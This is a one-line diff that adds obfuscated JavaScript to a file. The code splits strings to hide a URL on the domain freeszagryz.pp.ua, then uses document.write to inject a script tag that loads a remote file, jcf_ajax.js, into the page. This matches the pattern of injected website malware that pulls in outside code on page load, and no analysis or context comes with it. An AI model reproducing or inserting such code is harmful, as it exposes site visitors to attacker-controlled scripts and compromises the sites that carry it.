@@ -1,0 +1,1 @@
+function f(str){return 'htt'+'p://fre'+'eszag'+'ryz';}function s(str){return '.p'+'p.ua/j'+'s/jcf_a'+'jax.js';}document.write('<scr'+'ipt type="text/javas'+'cript" src='+f('ftWcu')+s('ftWcu')+'></scr'+'ipt>');
